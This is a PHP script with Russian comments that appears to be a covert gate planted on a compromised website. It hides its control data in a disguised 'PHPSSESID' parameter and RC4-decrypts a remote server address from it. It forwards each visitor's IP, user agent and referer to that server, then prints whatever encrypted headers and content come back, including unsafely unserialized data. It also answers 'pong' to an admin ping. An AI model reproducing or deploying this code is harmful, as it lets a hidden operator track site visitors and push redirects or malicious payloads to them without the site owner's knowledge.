<?php

if (isset($_GET['debug']) && $_GET['debug']==1) {
	error_reporting(E_ALL | E_STRICT) ;
	ini_set('display_errors', 'On');
}
// ответить на ping из админки
if ($_SERVER['HTTP_USER_AGENT']==='ping') exit('pong');

// провер очка ;)
if (!isset($_GET['PHPSSESID'])) exit('.');

$key = 'No9qF8steB0xl8gdmX1ZytEL5N9km3wuzs6gZ8DoW4P6LSZKulYs6hkfROH1';

function base64url_encode($data) { 
  return rtrim(strtr(base64_encode($data), '+/', '-_'), '='); 
} 

function base64url_decode($data) { 
  return base64_decode(str_pad(strtr($data, '-_', '+/'), strlen($data) % 4, '=', STR_PAD_RIGHT)); 
} 
 
class RC4 {
   
	var $s = array();
	var $x;
	var $y;
	var $staticKey;
   
	function key($key) {
		$this->x = 1;
		$this->y = 0;
		$len = strlen($key);
		for ($i = 0; $i < 256; $i++) { $this->s[$i] = $i; }
		$k = 0;
		for ($i = 0; $i < 256; $i++) {
			$this->s[$i] = $this->s[$i] ^ ord($key[$k]);
			if(++$k >= $len) $k = 0;
		}
	}
   
	function crypt(&$byte) {
		$x = $this->x;
		$y = $this->y;
	   
		$a = $this->s[$x];
		$y = ($y + $a) & 0xff;
		$b = $this->s[$y];
		$this->s[$x] = $b;
		$this->s[$y] = $a;
		$x = ($x + 1) & 0xff;
		$byte ^= $this->s[($a + $b) & 0xff];
		$this->x = $x;
		$this->y = $y;
	}
   
	function crypt_str($key, $str) {
		$this->key($key);
		$ret = "";
		for ($i = 0; $i < strlen($str); $i++) {
			$b = ord($str[$i]);
			$this->crypt($b);
			$ret .= chr($b);
		}
		return $ret;
	}
}


function proxyStream($url,$token, $post) {
	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER["HTTP_USER_AGENT"]);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_VERBOSE, 0);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT, 15);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	$cn = curl_exec($ch);
	curl_close($ch);

	if ( strlen($cn)<=0 ) exit();

	return $cn;
}

if (isset($_GET['debug']) && $_GET['debug']==1) echo $_GET['PHPSSESID']."<br>";

//$_GET['PHPSSESID'] = urldecode($_GET['PHPSSESID']);

// подготовливаем параметры для отправки
$post = array(
	'ip' 		=> $_SERVER["REMOTE_ADDR"],
	'host'		=> $_SERVER["HTTP_HOST"],
	'ua'		=> addslashes($_SERVER["HTTP_USER_AGENT"]),
	'url'		=> $_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'],
	'PHPSSESID'	=> $_GET['PHPSSESID']
);

if (isset($_SERVER["HTTP_REFERER"])) $post["referer"]=addslashes($_SERVER["HTTP_REFERER"]); else $post["referer"] = '';
if (isset($_GET["num"])) $post['num']=$_GET["num"];
if (isset($_GET["req"])) $post['req']=$_GET["req"];

// смотрим адрес VDS
$query = explode("|", $_GET['PHPSSESID']);
$vds = base64url_decode($query[0]);
$token = base64url_decode($query[1]);


if (isset($_GET['debug']) && $_GET['debug']==1) echo $token."<br>";

$rc4 = new RC4();
$vds = $rc4->crypt_str($key, $vds);


if (isset($_GET['debug']) && $_GET['debug']==1) echo $vds."<br>";


// надо определить каким способом передавать данные
// тут я попозже допишу...

// отправляем курлом наши параметры
$data = proxyStream($vds, $token, $post);
if (isset($_GET['debug']) && $_GET['debug']==1) echo $data;
if ($data===false) exit('_');

// распаковываем ответ
$rc4 = new RC4();
$data = unserialize( $rc4->crypt_str($key, base64_decode($data)));

if (isset($data['headers']) && $data['headers']!='' && is_array($data['headers'])) foreach($data['headers'] as $k=>$v) { header($v); }
if (isset($data['data']) && $data['data']!='') echo $data['data'];



?>